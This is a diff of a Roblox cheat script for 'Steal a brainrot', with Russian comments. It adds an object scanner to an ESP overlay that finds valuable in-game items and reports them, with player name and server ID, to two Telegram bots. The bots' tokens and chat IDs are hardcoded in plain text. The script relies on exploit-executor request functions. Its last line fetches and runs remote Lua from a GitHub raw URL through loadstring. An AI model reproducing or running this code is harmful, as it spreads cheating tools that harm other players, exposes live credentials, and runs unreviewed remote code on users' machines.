@@ -3,6 +3,7 @@ local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
 local SoundService = game:GetService("SoundService")
 local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
 local request = syn and syn.request or http and http.request or fluxus and fluxus.request or http_request or request
 
 -- Конфигурация ESP
@@ -21,7 +22,14 @@ local ESP_SETTINGS = {
     PlaySoundOnce = false
 }
 
--- Настройки ПЕРВОГО бота (основные уведомления)
+-- Настройки сканера
+local SCANNER_SETTINGS = {
+    ScanKey = Enum.KeyCode.F,
+    DebounceTime = 3,
+    IgnoreClasses = {"SurfaceAppearance", "Part"}
+}
+
+-- Настройки Telegram ботов
 local TG_MAIN = {
     Token = "7624455250:AAHXqHESVLzkJi7w9Q5YXyGf394dIfrXy1M",
     ChatId = "1072158346",
@@ -38,7 +46,6 @@ local TG_MAIN = {
     }
 }
 
--- Настройки ВТОРОГО бота (групповые уведомления)
 local TG_SPECIAL = {
     Token = "8403219194:AAHXD_oxTlI2YHWKFz6SKvspfo7hJY32Tsk",
     ChatId = "-1002767532824",
@@ -73,7 +80,14 @@ local OBJECT_EMOJIS = {
     ["Agarrini la Palini"] = "🥄"
 }
 
--- Список всех объектов
+-- Эмодзи для мутаций
+local MUTATION_EMOJIS = {
+    ["Gold"] = "🟨",
+    ["Lava"] = "🟧",
+    ["Rainbow"] = "🌈",
+    ["Diamond"] = "💎"
+}
+
 local OBJECT_NAMES = {
     "La Vacca Saturno Saturnita",
     "Chimpanzini Spiderini",
@@ -99,6 +113,7 @@ local espCache = {}
 local lastUpdate = 0
 local foundObjects = {}
 local objectsToNotify = {}
+local lastScanTime = 0
 
 -- Создаем интерфейс
 local screenGui = Instance.new("ScreenGui")
@@ -117,6 +132,131 @@ local function getServerId()
     return jobId ~= "" and jobId or "Одиночная игра"
 end
 
+local function getMutationEmoji(mutation)
+    return MUTATION_EMOJIS[mutation] or "⬜️"
+end
+
+-- Функции для сбора информации об объектах
+local function findMutation(obj)
+    -- 1. Проверяем атрибуты объекта
+    local mutation = obj:GetAttribute("Mutation")
+    if mutation then return tostring(mutation) end
+    
+    -- 2. Проверяем всех потомков объекта
+    for _, child in ipairs(obj:GetDescendants()) do
+        -- Ищем StringValue с именем Mutation
+        if child:IsA("StringValue") and child.Name == "Mutation" then
+            return child.Value
+        end
+        
+        -- Ищем ObjectValue с именем Mutation
+        if child:IsA("ObjectValue") and child.Name == "Mutation" and child.Value then
+            return child.Value.Name
+        end
+    end
+    
+    -- 3. Проверяем имя модели (иногда мутация указана в имени)
+    local nameParts = obj.Name:split(" ")
+    for _, part in ipairs(nameParts) do
+        if MUTATION_EMOJIS[part] then
+            return part
+        end
+    end
+    
+    return nil
+end
+
+local function findTraits(obj)
+    local traits = {}
+    
+    -- 1. Проверяем атрибуты
+    local traitsAttr = obj:GetAttribute("Traits")
+    if traitsAttr then
+        if type(traitsAttr) == "table" then
+            for _, v in pairs(traitsAttr) do
+                table.insert(traits, tostring(v))
+            end
+        else
+            table.insert(traits, tostring(traitsAttr))
+        end
+    end
+    
+    -- 2. Проверяем StringValue с именем "Trait" или "Traits"
+    for _, child in ipairs(obj:GetDescendants()) do
+        if child:IsA("StringValue") and (child.Name == "Trait" or child.Name == "Traits") then
+            table.insert(traits, child.Value)
+        end
+    end
+    
+    -- 3. Проверяем ObjectValue с именем "Trait"
+    for _, child in ipairs(obj:GetDescendants()) do
+        if child:IsA("ObjectValue") and (child.Name == "Trait" or child.Name == "Traits") and child.Value then
+            table.insert(traits, child.Value.Name)
+        end
+    end
+    
+    return traits
+end
+
+local function scanObject(obj)
+    if not obj or not obj.Parent then return nil end
+    
+    local mutation = findMutation(obj)
+    local traits = findTraits(obj)
+    
+    -- Если мутация не найдена стандартным способом, проверяем traits
+    if not mutation then
+        for _, trait in ipairs(traits) do
+            if MUTATION_EMOJIS[trait] then
+                mutation = trait
+                break
+            end
+        end
+    end
+    
+    return {
+        name = obj.Name,
+        mutation = mutation,
+        traits = traits
+    }
+end
+
+local function scanAllObjects()
+    local now = os.time()
+    if now - lastScanTime < SCANNER_SETTINGS.DebounceTime then
+        print("Подождите...")
+        return
+    end
+    
+    lastScanTime = now
+    print("\n🔍 Начинаем сканирование всех объектов...")
+    
+    local foundCount = 0
+    
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if table.find(OBJECT_NAMES, obj.Name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
+            local details = scanObject(obj)
+            if details then
+                foundCount = foundCount + 1
+                print("\n=== ОБЪЕКТ #"..foundCount.." ===")
+                print("Имя:", details.name)
+                print("Мутация:", details.mutation or "Нет")
+                print("Traits ("..#details.traits.."):")
+                for i, trait in ipairs(details.traits) do
+                    print(i..".", trait)
+                end
+            end
+        end
+    end
+    
+    if foundCount == 0 then
+        print("❌ Объекты не найдены")
+    else
+        print("\n=== РЕЗУЛЬТАТ ===")
+        print("Найдено объектов:", foundCount)
+    end
+end
+
 -- Отправка в ОСНОВНОГО бота
 local function sendMainTelegramAlert()
     if not TG_MAIN.Enabled or not request or #objectsToNotify == 0 then return end
@@ -128,19 +268,20 @@ local function sendMainTelegramAlert()
     local importantObjects = {}
     local regularObjects = {}
     
-    for _, objName in ipairs(objectsToNotify) do
+    for _, objData in ipairs(objectsToNotify) do
+        local objName = objData.name
         if not TG_SPECIAL.SpecialObjects[objName] then
             if TG_MAIN.ImportantObjects[objName] then
-                table.insert(importantObjects, objName)
+                table.insert(importantObjects, objData)
             else
-                table.insert(regularObjects, objName)
+                table.insert(regularObjects, objData)
             end
         end
     end
     
     if #importantObjects + #regularObjects == 0 then return end
     
-    -- Формируем сообщение с выделением важных объектов
+    -- Формируем сообщение
     local message = string.format(
         "*🔍 Обнаружены объекты в Steal a brainrot*\n"..
         "👤 Игрок: `@%s`\n"..
@@ -149,11 +290,21 @@ local function sendMainTelegramAlert()
         username, serverId, os.date("%X")
     )
     
-    -- Добавляем ВАЖНЫЕ объекты с пометкой 🚨
+    -- Добавляем ВАЖНЫЕ объекты
     if #importantObjects > 0 then
         message = message .. "*🚨 ВАЖНЫЕ ОБЪЕКТЫ:*\n"
-        for _, objName in ipairs(importantObjects) do
-            message = message .. string.format("%s *%s*\n", OBJECT_EMOJIS[objName] or "⚠️", objName)
+        for _, objData in ipairs(importantObjects) do
+            local emoji = OBJECT_EMOJIS[objData.name] or "⚠️"
+            local mutationEmoji = getMutationEmoji(objData.mutation)
+            
+            message = message .. string.format("%s%s %s", emoji, mutationEmoji, objData.name)
+            
+            -- Добавляем traits через +
+            if #objData.traits > 0 then
+                message = message .. " + " .. table.concat(objData.traits, " + ")
+            end
+            
+            message = message .. "\n"
         end
         message = message .. "\n"
     end
@@ -161,15 +312,25 @@ local function sendMainTelegramAlert()
     -- Добавляем обычные объекты
     if #regularObjects > 0 then
         message = message .. "*🔹 Обычные объекты:*\n"
-        for _, objName in ipairs(regularObjects) do
-            message = message .. string.format("%s %s\n", OBJECT_EMOJIS[objName] or "🔸", objName)
+        for _, objData in ipairs(regularObjects) do
+            local emoji = OBJECT_EMOJIS[objData.name] or "🔸"
+            local mutationEmoji = getMutationEmoji(objData.mutation)
+            
+            message = message .. string.format("%s%s %s", emoji, mutationEmoji, objData.name)
+            
+            -- Добавляем traits через +
+            if #objData.traits > 0 then
+                message = message .. " + " .. table.concat(objData.traits, " + ")
+            end
+            
+            message = message .. "\n"
         end
     end
     
     -- Код телепортации
     if serverId ~= "Одиночная игра" then
         message = message .. string.format(
-            "\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
+            "\n🚀 Телепорт:\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
             serverId
         )
     end
@@ -190,22 +351,29 @@ local function sendMainTelegramAlert()
 end
 
 -- Отправка в ГРУППУ (специальные объекты)
-local function sendSpecialTelegramAlert(objName)
+local function sendSpecialTelegramAlert(objData)
     if not TG_SPECIAL.Enabled or not request then return end
     
     local serverId = getServerId()
     local username = getAccountInfo()
-    local emoji = OBJECT_EMOJIS[objName] or "🔹"
+    local emoji = OBJECT_EMOJIS[objData.name] or "🔹"
+    local mutationEmoji = getMutationEmoji(objData.mutation)
     
     local message = string.format(
-        "*🔔 ОБНАРУЖЕН СПЕЦИАЛЬНЫЙ ОБЪЕКТ 🔔*\n"..
-        "🕹 Игра: Steal a brainrot\n"..
+        "*🔔 СПЕЦИАЛЬНЫЙ ОБЪЕКТ 🔔*\n"..
+        "%s%s %s", emoji, mutationEmoji, objData.name)
+        
+    -- Добавляем traits через +
+    if #objData.traits > 0 then
+        message = message .. " + " .. table.concat(objData.traits, " + ")
+    end
+    
+    message = message .. string.format(
+        "\n🕹 Игра: Steal a brainrot\n"..
         "👤 Игрок: `@%s`\n"..
         "🌐 Сервер: `%s`\n"..
-        "🕘 Время: `%s`\n\n"..
-        "%s *%s*",
-        username, serverId, os.date("%X"), emoji, objName
-    )
+        "🕘 Время: `%s`",
+        username, serverId, os.date("%X"))
     
     if serverId ~= "Одиночная игра" then
         message = message .. string.format(
@@ -214,9 +382,8 @@ local function sendSpecialTelegramAlert(objName)
         )
     end
     
-    local url = "https://api.telegram.org/bot"..TG_SPECIAL.Token.."/sendMessage"
     local response = request({
-        Url = url,
+        Url = "https://api.telegram.org/bot"..TG_SPECIAL.Token.."/sendMessage",
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
@@ -349,13 +516,14 @@ local function updateESP(deltaTime)
 
             if not espCache[obj] then
                 espCache[obj] = createESPElement(obj)
+                local objData = scanObject(obj)
                 playDetectionSound()
                 
                 if isNewObject then
-                    table.insert(objectsToNotify, obj.Name)
+                    table.insert(objectsToNotify, objData)
                     -- Отправка в специального бота
                     if TG_SPECIAL.SpecialObjects[obj.Name] then
-                        sendSpecialTelegramAlert(obj.Name)
+                        sendSpecialTelegramAlert(objData)
                     end
                 end
             end
@@ -383,10 +551,18 @@ Players.PlayerAdded:Connect(function(player)
     end)
 end)
 
+-- Обработчик клавиши сканера
+UserInputService.InputBegan:Connect(function(input)
+    if input.KeyCode == SCANNER_SETTINGS.ScanKey then
+        scanAllObjects()
+    end
+end)
+
 -- Первоначальное сканирование
 updateESP(0)
 
 print("Steal a brainrot ESP System активирован!")
 print("Отслеживается объектов: "..#OBJECT_NAMES)
 print("ID сервера:", getServerId())
+print("\nНажмите F для сканирования всех объектов")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
